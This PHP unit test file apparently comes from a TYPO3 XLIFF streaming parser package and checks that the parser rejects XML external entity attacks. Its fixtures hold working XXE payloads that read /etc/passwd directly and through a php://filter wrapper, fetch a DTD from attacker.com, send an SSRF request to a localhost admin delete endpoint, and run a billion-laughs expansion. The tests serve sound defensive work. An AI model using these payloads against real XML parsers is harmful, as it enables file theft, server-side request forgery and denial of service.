<?php

declare(strict_types=1);

namespace Netresearch\NrXliffStreaming\Tests\Unit\Parser;

use Netresearch\NrXliffStreaming\Exception\InvalidXliffException;
use Netresearch\NrXliffStreaming\Parser\XliffStreamingParser;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\Test;
use TYPO3\TestingFramework\Core\Unit\UnitTestCase;

/**
 * XXE (XML External Entity) Attack Protection Tests
 *
 * Tests that the streaming parser is protected against XXE attacks:
 * - CWE-611: Improper Restriction of XML External Entity Reference
 * - CVSS 7.5-8.5 (HIGH severity)
 *
 * @author Netresearch DTT GmbH
 */
#[CoversClass(XliffStreamingParser::class)]
final class XliffStreamingParserXXETest extends UnitTestCase
{
    private XliffStreamingParser $xliffStreamingParser;

    protected function setUp(): void
    {
        parent::setUp();
        $this->xliffStreamingParser = new XliffStreamingParser();
    }

    #[Test]
    public function xxePayloadWithFileReadIsBlocked(): void
    {
        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="xxe.test">
                <source>&xxe;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        // LIBXML_NONET blocks external entities, causing parsing to fail
        // This is expected and secure behavior - fail-safe, not fail-open
        $this->expectException(InvalidXliffException::class);
        $this->expectExceptionCode(1700000003);
        $this->expectExceptionMessage('external entities are blocked');

        iterator_to_array($this->xliffStreamingParser->parseTransUnits($xxePayload));
    }

    #[Test]
    public function xxePayloadWithNetworkAccessIsBlocked(): void
    {
        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="network.test">
                <source>&xxe;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        // LIBXML_NONET flag prevents network access, causing parsing to fail
        $this->expectException(InvalidXliffException::class);
        $this->expectExceptionCode(1700000003);

        iterator_to_array($this->xliffStreamingParser->parseTransUnits($xxePayload));
    }

    #[Test]
    public function billionLaughsAttackIsMitigated(): void
    {
        $billionLaughs = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="dos.test">
                <source>&lol3;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        // The parser rejects the billion-laughs payload with InvalidXliffException,
        // which is the secure behaviour. Which internal libxml rejection path fires --
        // entity-reference-loop / failed-to-read (code 1700000002) during expand(), or
        // "external entities are blocked" (code 1700000003) when re-reading the
        // trans-unit -- depends on the libxml version, so we assert on the stable
        // contract (rejection via one of the entity-protection paths) rather than the
        // exact code or message text, which vary with the libxml version.
        try {
            iterator_to_array($this->xliffStreamingParser->parseTransUnits($billionLaughs));
            self::fail('Expected InvalidXliffException for billion-laughs payload');
        } catch (InvalidXliffException $invalidXliffException) {
            self::assertContains(
                $invalidXliffException->getCode(),
                [1700000002, 1700000003],
                'Billion-laughs payload must be rejected by an entity-protection path',
            );
        }
    }

    #[Test]
    public function xxePayloadWithPhpWrapperIsBlocked(): void
    {
        $phpWrapper = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="php.test">
                <source>&xxe;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        // PHP wrapper access is blocked by LIBXML_NONET
        $this->expectException(InvalidXliffException::class);
        $this->expectExceptionCode(1700000003);

        iterator_to_array($this->xliffStreamingParser->parseTransUnits($phpWrapper));
    }

    #[Test]
    public function ssrfAttackViaXxeIsBlocked(): void
    {
        $ssrfPayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY xxe SYSTEM "http://localhost:8080/admin/delete-all">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="ssrf.test">
                <source>&xxe;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        // SSRF via XXE is blocked by LIBXML_NONET, causing parsing to fail
        $this->expectException(InvalidXliffException::class);
        $this->expectExceptionCode(1700000003);

        iterator_to_array($this->xliffStreamingParser->parseTransUnits($ssrfPayload));
    }
}
